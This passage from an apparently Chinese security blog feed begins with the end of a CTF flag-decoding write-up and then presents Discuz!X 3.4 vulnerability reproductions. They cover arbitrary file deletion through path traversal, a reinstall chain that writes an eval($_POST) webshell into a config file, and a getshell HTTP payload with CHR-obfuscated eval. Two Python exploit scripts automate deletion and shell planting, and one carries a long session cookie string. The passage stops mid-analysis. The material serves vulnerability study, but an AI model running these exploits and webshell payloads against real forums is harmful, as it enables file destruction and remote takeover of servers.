<p><code>/-.-..--/---.-../--..--/--..---/--.-../--.---./--..../--..---/---..-./--.-../---..../--.-.../----..-/-.-----/--...-/---..--/-.-----/--...-/--.---./---.-../--..--/---..-./--..--/---..--/---.-../--...-/--.---./--..---/</code></p>
<p>解码得到</p>
<p><code>%u53%u74,%u67%u34%u6e%u30%u67%u72%u34%u70%u68%u79%u5f%u31%u73%u5f%u31%u6e%u74,%u72,%u73%u74%u31%u6e%u67</code></p>
<p>%替换成\解unicode</p>
<p>要注意的是还有仨逗号。。根据语义，替换成e不对替换成3对了。</p>
<p><img src="/images/pcb2018/greatwall2.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dz系列漏洞</title>
    <url>/2020/03/23/dz-xi-lie-lou-dong/</url>
    <content><![CDATA[<h2 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h2><h3 id="1、简述"><a href="#1、简述" class="headerlink" title="1、简述"></a>1、简述</h3><p><strong>漏洞原因：</strong>之前存在的任意文件删除漏洞修复不完全导致可以绕过。</p>
<p><strong>漏洞修复时间：</strong>2017年9月29日官方对gitee上的代码进行了<a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574">修复</a></p>
<h3 id="2、复现环境"><a href="#2、复现环境" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>因为官方提供的下载是最新的源码，漏洞修复时间是17年9月29日，通过git找一个修复前的版本签出就可。</p>
<pre><code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code></pre>
<p>通过安装向导安装完后注册一个测试用户，同时在网站对应目录下创建用于删除的测试文件。</p>
<h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>登录账户。</p>
<p>访问该网页：<code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</code></p>
<p>发送POST请求：</p>
<pre><code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base
POST
birthprovince=../../../testfile.txt&amp;profilesubmit=1&amp;formhash=e9d84225
formhash值为用户hash，可在源码中搜索formhash找到。</code></pre>
<p>请求后表单中的出生地内容变为<code>../../../testfile.txt</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1.png"></p>
<p>然后构造请求向<code>home.php?mod=spacecp&amp;ac=profile&amp;op=base</code>上传文件，可以修改表单提交达到目的。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/3.png"></p>
<p>提交后文件被删除。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/2.png"></p>
<h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下对该页面请求时的流程。</p>
<p>在<code>home.php</code>的41行有一次对其他文件的请求：</p>
<pre><code class="php">require_once libfile(&#39;home/&#39;.$mod, &#39;module&#39;);</code></pre>
<p>因为GET参数不满足上面代码的条件所以进入这部分。</p>
<p>查看libfile函数的定义：</p>
<pre><code class="php">function libfile($libname, $folder = &#39;&#39;) &#123;
    $libpath = &#39;/source/&#39;.$folder;
    if(strstr($libname, &#39;/&#39;)) &#123;
        list($pre, $name) = explode(&#39;/&#39;, $libname);
        $path = &quot;&#123;$libpath&#125;/&#123;$pre&#125;/&#123;$pre&#125;_&#123;$name&#125;&quot;;
    &#125; else &#123;
        $path = &quot;&#123;$libpath&#125;/&#123;$libname&#125;&quot;;
    &#125;
    return preg_match(&#39;/^[\w\d\/_]+$/i&#39;, $path) ? realpath(DISCUZ_ROOT.$path.&#39;.php&#39;) : false;
&#125;</code></pre>
<p>可以看出该函数的功能就是构造文件路径。</p>
<p>对于复现漏洞时请求页面的GET请求参数：<code>mod=spacecp&amp;ac=profile&amp;op=base</code></p>
<p>在如上参数的请求时，经过<code>libfile</code>函数处理过后返回的路径为:<code>/source/module/home/home_spacecp.php</code></p>
<p>跟进到<code>/source/module/home/home_spacecp.php</code>文件，在最后一行也引入了其他的文件,处理方式同上</p>
<pre><code class="php">require_once libfile(&#39;spacecp/&#39;.$ac, &#39;include&#39;);</code></pre>
<p>所以这里引入的文件为：<code>/source/include/spacecp/spacecp_profile.php</code>，转到该文件看看。</p>
<p>在第70行，存在如下条件判断，这里也就是页面上的保存按钮点击后触发的相关处理代码：</p>
<pre><code class="php">if(submitcheck(&#39;profilesubmit&#39;)) &#123;
  ......</code></pre>
<p><code>submitcheck</code>函数是对profilesubmit的安全检查</p>
<pre><code class="php">function submitcheck($var, $allowget = 0, $seccodecheck = 0, $secqaacheck = 0) &#123;
    if(!getgpc($var)) &#123;
        return FALSE;
    &#125; else &#123;
        return helper_form::submitcheck($var, $allowget, $seccodecheck, $secqaacheck);
    &#125;
&#125;</code></pre>
<p>第187行开始是对文件上传的处理函数：</p>
<pre><code class="php">    if($_FILES) &#123;
        $upload = new discuz_upload();
        foreach($_FILES as $key =&gt; $file) &#123;
    ......</code></pre>
<p>第207行开始：</p>
<pre><code class="php">if(!$upload-&gt;error()) &#123;
                $upload-&gt;save();

                if(!$upload-&gt;get_image_info($attach[&#39;target&#39;])) &#123;
                    @unlink($attach[&#39;target&#39;]);
                    continue;
                &#125;
                $setarr[$key] = &#39;&#39;;
                $attach[&#39;attachment&#39;] = dhtmlspecialchars(trim($attach[&#39;attachment&#39;]));
                if($vid &amp;&amp; $verifyconfig[&#39;available&#39;] &amp;&amp; isset($verifyconfig[&#39;field&#39;][$key])) &#123;
                    if(isset($verifyinfo[&#39;field&#39;][$key])) &#123;
                        @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
                        $verifyarr[$key] = $attach[&#39;attachment&#39;];
                    &#125;
                    continue;
                &#125;
                if(isset($setarr[$key]) &amp;&amp; $_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;needverify&#39;]) &#123;
                    @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
                    $verifyarr[$key] = $attach[&#39;attachment&#39;];
                    continue;
                &#125;
                @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);
                $setarr[$key] = $attach[&#39;attachment&#39;];
            &#125;</code></pre>
<p>文件上传成功，满足<code>!$upload-&gt;error()</code>，会执行到unlink语句：</p>
<pre><code class="php">@unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);</code></pre>
<p>这里的<code>$key</code>，在前面<code>foreach($_FILES as $key =&gt; $file)</code>中定义(189行)。<code>$space</code>在第23行定义，为用户个人资料。</p>
<pre><code class="php">$space = getuserbyuid($_G[&#39;uid&#39;]);
space_merge($space, &#39;field_home&#39;);
space_merge($space, &#39;profile&#39;);</code></pre>
<p>会从数据库查询用户相关的信息保存到变量$space中。<code>birthprovince</code>就是其中之一。</p>
<p>所以此时<code>$space[key] = $space[birthprovince] = &#39;../../../testfile.txt&#39;</code></p>
<p>也就解释了复现时修改出生日期为目的文件路径的操作。</p>
<p>这样的话在这里就完成了文件删除的操作。</p>
<p>PS：更改用户信息时通过提交表单事时抓包可以看到各参数名称，可以进行修改。</p>
<h3 id="5、Exp"><a href="#5、Exp" class="headerlink" title="5、Exp"></a>5、Exp</h3><p>exp改了半天也没有攻击成功，找了公开的exp也不成功，不知道是exp问题还是环境问题。</p>
<pre><code class="python">import requests
import re
import os

def check_url(target_url):
    parameter = target_url.split(&#39;/&#39;)
    if parameter[-1] != &quot;home.php&quot;:
            print(&quot;[*] Please make sure the url end with &#39;home.php&#39;&quot;)
            exit()

def get_cookie(target_url):
    cookie = input(&quot;[*] Please paste the cookie:&quot;).split(&#39;;&#39;)  
    cookies = &#123;&#125;
    for i in range(0,len(cookie)):
        name,value=cookie[i].strip().split(&#39;=&#39;,1)
        cookies[name] = value
    loginurl = target_url + &#39;?mod=spacecp&#39;
    text = requests.get(target_url,cookies=cookies).text
    if &#39;您需要先登录才能继续本操作&#39; in text:
        print(&quot;[*] Login error,please check cookies!&quot;)
    else:
        return cookies


def del_file(target_url,target_file,cookies):
    loginurl = target_url + &#39;?mod=spacecp&#39;
    text = requests.get(target_url,cookies=cookies).text
    reformhash = &#39;formhash=.*?&amp;&#39;
    patternformhash = re.compile(reformhash)
    formhash = patternformhash.search(text).group()[9:17]
    print(formhash)
    # set birthprovince
    birthprovinceurl = target_url + &#39;?mod=spacecp&amp;ac=profile&#39;
    birthprovincedata =&#123;
                    &quot;birthprovince&quot;:target_file,
                    &quot;profilesubmit&quot;:&quot;1&quot;,
                    &quot;formhash&quot;:formhash
                    &#125;
    requests.post(birthprovinceurl,cookies=cookies,data=birthprovincedata)
    # upload a picture and delete the target file
    basepath = os.path.abspath(os.path.dirname(__file__))
    uploadurl = target_url + &#39;?mod=spacecp&amp;ac=profile&amp;op=base&#39;
    files = &#123;&#39;birthprovince&#39;: (&quot;pic.png&quot;,open(basepath+&#39;/1.png&#39;, &#39;rb&#39;))&#125;
    data = &#123;
        &#39;formhash&#39;:formhash,
        &#39;profilesubmit&#39;:&#39;1&#39;
        &#125;
    s=requests.post(uploadurl,cookies=cookies,data=data,files=files)
    print(s.text)
    print(&quot;[*] Deleting the file.&quot;)


def exp():
    try:
        target_url = input(&quot;[*] please input the target url(eg:http://xxxxx/home.php):&quot;)
        check_url(target_url)
        cookies,formhash = get_cookie(target_url)
        target_file = input(&quot;[*] Please input the target file:&quot;)
        del_file(target_url,target_file,cookies,formhash)
    except KeyError as e:
        print(&quot;This poc doesn&#39;t seem to work.&quot;)

if __name__ == &quot;__main__&quot;:
    exp()   </code></pre>
<h3 id="5、修复方法"><a href="#5、修复方法" class="headerlink" title="5、修复方法"></a>5、修复方法</h3><p>对比官方的代码变动，直接删除了几条unlink语句，简单暴力..</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1_5.png"></p>
<h2 id="Discuz-X-V3-4后台任意文件删除"><a href="#Discuz-X-V3-4后台任意文件删除" class="headerlink" title="Discuz!X V3.4后台任意文件删除"></a>Discuz!X V3.4后台任意文件删除</h2><h3 id="1、简述-1"><a href="#1、简述-1" class="headerlink" title="1、简述"></a>1、简述</h3><p>后台任意文件删除，需要有管理员的权限。</p>
<h3 id="2、复现环境-1"><a href="#2、复现环境-1" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
<h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>登陆后台，进入论坛-&gt;模块管理-&gt;编辑板块，使用burp拦截提交的数据。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_1.png"></p>
<p>修改请求包，添加参数 <code>&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_2.png"></p>
<p>发送，查看文件发现被删除。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_3.png"></p>
<h3 id="4、漏洞分析-1"><a href="#4、漏洞分析-1" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下该请求的流程。</p>
<p>请求URL：<code>/dz/upload/admin.php?action=forums&amp;operation=edit&amp;fid=2&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
<p>在<code>admin.php</code>中接收了action参数，在第58行经过<code>admincpfile</code>函数处理后返回文件路径，并包含该文件。</p>
<pre><code class="php">    if($admincp-&gt;allow($action, $operation, $do) || $action == &#39;index&#39;) &#123;
        require $admincp-&gt;admincpfile($action);</code></pre>
<p>看一下该函数的处理过程：</p>
<pre><code class="php">    function admincpfile($action) &#123;
        return &#39;./source/admincp/admincp_&#39;.$action.&#39;.php&#39;;
    &#125;</code></pre>
<p>经过处理返回的内容是：<code>./source/admincp/admincp_forums.php</code>，也就来到了漏洞存在的地方。</p>
<p>根据if/else的判断条件，进入else中的代码：</p>
<pre><code class="php">if(!submitcheck(&#39;detailsubmit&#39;)) &#123;
  ......
&#125;
else&#123;

&#125;</code></pre>
<p>造成漏洞的代码：</p>
<pre><code class="php">if(!$multiset) &#123;
  if($_GET[&#39;delreplybg&#39;]) &#123;
    $valueparse = parse_url($_GET[&#39;replybgnew&#39;]);
    if(!isset($valueparse[&#39;host&#39;]) &amp;&amp; file_exists($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;])) &#123;
      @unlink($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;]);
    &#125;
    $_GET[&#39;replybgnew&#39;] = &#39;&#39;;
  &#125;</code></pre>
<p><code>$multiset</code>默认为0，只要不给该参数赋值就满足条件进入if语句。</p>
<p>第二个if语句，检查GET参数<code>delreplybg</code>有没有内容，然后做了下检测，检测parse_url函数返回的结果中有没有host这个变量，来确保GET参数<code>replybgnew</code>不是url，但是并不影响传入文件路径。</p>
<p>这里<code>$_G[&#39;setting&#39;][&#39;attachurl&#39;</code>的值为<code>data/attachment/</code>，再拼接上<code>common/</code>和<code>$_GET[&#39;replybgnew&#39;]</code>，这样路径就可控了。通过unlink达到文件删除的目的。</p>
<h2 id="任意文件删除配合install过程getshell"><a href="#任意文件删除配合install过程getshell" class="headerlink" title="任意文件删除配合install过程getshell"></a>任意文件删除配合install过程getshell</h2><h3 id="1、简述-2"><a href="#1、简述-2" class="headerlink" title="1、简述"></a>1、简述</h3><p>这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉<code>install.lock</code>文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。</p>
<p>表前缀：<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
<p>但是我在使用上面版本v3.4的代码时发现，安装后<code>install</code>目录下不存在<code>index.php</code>了。分析代码发现会有安装后的删除处理，在<code>/source/admincp/admincp_index.php</code>的第14行：</p>
<pre><code class="php">if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;) &amp;&amp; !DISCUZ_DEBUG) &#123;
    @unlink(DISCUZ_ROOT.&#39;./install/index.php&#39;);
    if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;)) &#123;
        dexit(&#39;Please delete install/index.php via FTP!&#39;);
    &#125;
&#125;</code></pre>
<p>那是不是老版本存在该问题呢？</p>
<p>我翻了历史版本代码，直到git提交的第一个版本都有如上的处理。</p>
<p>但还是分析一下吧，就当学习了。</p>
<p><strong>可以利用的条件：</strong>1、安装后没有登录后台，此时install/index还没删除 2、因为其他原因没有删除</p>
<h3 id="2、复现环境-2"><a href="#2、复现环境-2" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
<h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>如果安装后<code>install/index.php</code>因为某些原因还存在，直接访问会有如下警告：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_1.png"></p>
<p>通过文件删除漏洞删除data目录下的<code>install.lock</code>文件就可以重新安装。</p>
<p>安装过程修改表前缀内容为：<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_2.png"></p>
<p>在<code>config/config_ucenter.php</code>中已经写入了webshell。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_3.png"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_4.png"></p>
<h3 id="4、漏洞分析-2"><a href="#4、漏洞分析-2" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下安装逻辑，<code>install/index.php</code>文件的整体流程如下：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_5.png"></p>
<p>分别是我们安装的每一步，接受协议-&gt;环境检测-&gt;是否安装 UCenter Server-&gt;数据库配置信息-&gt;安装过程，生成lock文件-&gt;检查</p>
<p>问题出在在 <code>db_init</code> 的处理中，在代码第369行：</p>
<pre><code class="php">        if(DZUCFULL) &#123;
            install_uc_server();
        &#125;</code></pre>
<p>跟进<code>install_uc_server</code>，在1296行可以发现对config参数没做任何过滤传入到<code>save_uc_config</code>中：</p>
<pre><code class="php">save_uc_config($config, ROOT_PATH.&#39;./config/config_ucenter.php&#39;);</code></pre>
<p>然后<code>save_uc_config</code>也没做任何安全处理，就拼接参数后写入文件：</p>
<pre><code class="php">function save_uc_config($config, $file) &#123;

    $success = false;

    list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;

    $link = function_exists(&#39;mysql_connect&#39;) ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);
    $uc_connnect = $link ? &#39;mysql&#39; : &#39;&#39;;

    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
    $year = date(&#39;Y&#39;);
    $config = &lt;&lt;&lt;EOT
&lt;?php


define(&#39;UC_CONNECT&#39;, &#39;$uc_connnect&#39;);

define(&#39;UC_DBHOST&#39;, &#39;$ucdbhost&#39;);
define(&#39;UC_DBUSER&#39;, &#39;$ucdbuser&#39;);
define(&#39;UC_DBPW&#39;, &#39;$ucdbpw&#39;);
define(&#39;UC_DBNAME&#39;, &#39;$ucdbname&#39;);
define(&#39;UC_DBCHARSET&#39;, &#39;$ucdbcharset&#39;);
define(&#39;UC_DBTABLEPRE&#39;, &#39;`$ucdbname`.$uctablepre&#39;);
define(&#39;UC_DBCONNECT&#39;, 0);

define(&#39;UC_CHARSET&#39;, &#39;$uccharset&#39;);
define(&#39;UC_KEY&#39;, &#39;$appauthkey&#39;);
define(&#39;UC_API&#39;, &#39;$ucapi&#39;);
define(&#39;UC_APPID&#39;, &#39;$appid&#39;);
define(&#39;UC_IP&#39;, &#39;$ucip&#39;);
define(&#39;UC_PPP&#39;, 20);
?&gt;
EOT;

    if($fp = fopen($file, &#39;w&#39;)) &#123;
        fwrite($fp, $config);
        fclose($fp);
        $success = true;
    &#125;
    return $success;
&#125;</code></pre>
<p>因为 <code>dbhost, dbuser </code>等参数需要用来连接数据库，所以利用 <code>tablepre</code> 向配置文件写入shell。</p>
<h3 id="5、Exp-1"><a href="#5、Exp-1" class="headerlink" title="5、Exp"></a>5、Exp</h3><blockquote>
<p><a href="https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b">https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b</a></p>
</blockquote>
<pre><code class="python">#!/usr/bin/env python3
import base64
import random
import re
import string

import requests

sess = requests.Session()
randstr = lambda len=5: &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(len))

##################################################
########## Customize these parameters ############
target = &#39;http://localhost/discuzx&#39;
# login target site first, and copy the cookie here
cookie = &quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;
shell_password = randstr()
db_host = &#39;&#39;
db_user = &#39;&#39;
db_pw = &#39;&#39;
db_name = &#39;&#39;
#################################################

path = &#39;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#39;
url = target + path

sess.headers.update(&#123;
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#39;,
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
    &#39;Referer&#39;: url&#125;)


# sess.proxies.update(&#123;&#39;http&#39;: &#39;socks5://localhost:1080&#39;&#125;)
# sess.proxies.update(&#123;&#39;http&#39;: &#39;http://localhost:8080&#39;&#125;)


def login(username=None, password=None):
    sess.headers.update(&#123;&#39;Cookie&#39;: cookie&#125;)


def get_form_hash():
    r = sess.get(url)
    match = re.search(r&#39;&quot;member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)&quot;&#39;, r.text, re.I)
    if match:
        return match.group(1)


def tamper(formhash, file_to_delete):
    data = &#123;
        &#39;formhash&#39;: (None, formhash),
        &#39;profilesubmit&#39;: (None, &#39;true&#39;),
        &#39;birthprovince&#39;: (None, file_to_delete)
    &#125;
    r = sess.post(url, files=data)
    if &#39;parent.show_success&#39; in r.text:
        print(&#39;tamperred successfully&#39;)
        return True


def delete(formhash, file):
    if not tamper(formhash, file):
        return False

    image = b&#39;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#39;
    data = &#123;
        &#39;formhash&#39;: formhash,
        &#39;profilesubmit&#39;: &#39;true&#39;
    &#125;
    files = &#123;
        &#39;birthprovince&#39;: (&#39;image.png&#39;, base64.b64decode(image), &#39;image/png&#39;)
    &#125;
    r = sess.post(url, data=data, files=files)
    if &#39;parent.show_success&#39; in r.text:
        print(&#39;delete &#123;&#125; successfully&#39;.format(file))
        return True


def getshell():
    install_url = target + &#39;/install/index.php&#39;
    r = sess.get(install_url)
    if &#39;安装向导&#39; not in r.text:
        print(&#39;install directory not exists&#39;)
        return False

    table_prefix = &quot;x&#39;);@eval($_POST[&#123;&#125;]);(&#39;&quot;.format(shell_password)
    data = &#123;
        &#39;step&#39;: 3,
        &#39;install_ucenter&#39;: &#39;yes&#39;,
        &#39;dbinfo[dbhost]&#39;: db_host,
        &#39;dbinfo[dbname]&#39;: db_name,
        &#39;dbinfo[dbuser]&#39;: db_user,
        &#39;dbinfo[dbpw]&#39;: db_pw,
        &#39;dbinfo[tablepre]&#39;: table_prefix,
        &#39;dbinfo[adminemail]&#39;: &#39;admin@admin.com&#39;,
        &#39;admininfo[username]&#39;: &#39;admin&#39;,
        &#39;admininfo[password]&#39;: &#39;admin&#39;,
        &#39;admininfo[password2]&#39;: &#39;admin&#39;,
        &#39;admininfo[email]&#39;: &#39;admin@admin.com&#39;,
    &#125;
    r = sess.post(install_url, data=data)
    if &#39;建立数据表 CREATE TABLE&#39; not in r.text:
        print(&#39;write shell failed&#39;)
        return False
    print(&#39;shell: &#123;&#125;/config/config_ucenter.php&#39;.format(target))
    print(&#39;password: &#123;&#125;&#39;.format(shell_password))


if __name__ == &#39;__main__&#39;:
    login()
    form_hash = get_form_hash()
    if form_hash:
        delete(form_hash, &#39;../../../data/install.lock&#39;)
        getshell()
    else:
        print(&#39;failed&#39;)</code></pre>
<h2 id="Dz全版本，版本转换功能导致Getshell"><a href="#Dz全版本，版本转换功能导致Getshell" class="headerlink" title="Dz全版本，版本转换功能导致Getshell"></a>Dz全版本，版本转换功能导致Getshell</h2><h3 id="1、简述-3"><a href="#1、简述-3" class="headerlink" title="1、简述"></a>1、简述</h3><p>存在问题的代码在<code>/utility/convert/</code>目录下，这部分的功能主要是用于Dz系列产品升级/转换。</p>
<p><strong>影响范围：</strong>全版本</p>
<p><strong>条件：</strong>存在<code>/utility/convert/</code>目录和相应功能。</p>
<h3 id="2、复现环境-3"><a href="#2、复现环境-3" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上，目前gitee最新版代码依然存在该漏洞。</p>
<h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>在产品升级/转换-&gt;选择产品转换程序 -&gt;设置服务器信息 这里抓包，</p>
<p>payload：</p>
<pre><code>POST /dz/utility/convert/index.php HTTP/1.1
Host: 127.0.0.1:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
Origin: http://127.0.0.1:8001
Connection: close
Referer: http://127.0.0.1:8001/dz/utility/convert/index.php
Upgrade-Insecure-Requests: 1

a=config&amp;source=d7.2_x1.5&amp;submit=yes&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_utility/4_1.png"></p>
<h3 id="4、漏洞分析-3"><a href="#4、漏洞分析-3" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>入口<code>utility/convert/index.php</code></p>
<pre><code class="php">require &#39;./include/common.inc.php&#39;;

$action = getgpc(&#39;a&#39;);
$action = empty($action) ? getgpc(&#39;action&#39;) : $action;
$source = getgpc(&#39;source&#39;) ? getgpc(&#39;source&#39;) : getgpc(&#39;s&#39;);</code></pre>
<p> 取<code>$_POST[&#39;a&#39;]</code>,直接赋值给<code>$action </code>，此时<code>$action = config</code>;</p>
<pre><code class="php">&#125; elseif($action == &#39;config&#39; || CONFIG_EMPTY) &#123;      
    require DISCUZ_ROOT.&#39;./include/do_config.inc.php&#39;;  
&#125; elseif($action == &#39;setting&#39;) &#123;</code></pre>
<p>满足条件，引入<code>./include/do_config.inc.php</code></p>
<pre><code class="php">@touch($configfile);
 ......
if(submitcheck()) &#123;
    $newconfig = getgpc(&#39;newconfig&#39;);
    if(is_array($newconfig)) &#123;
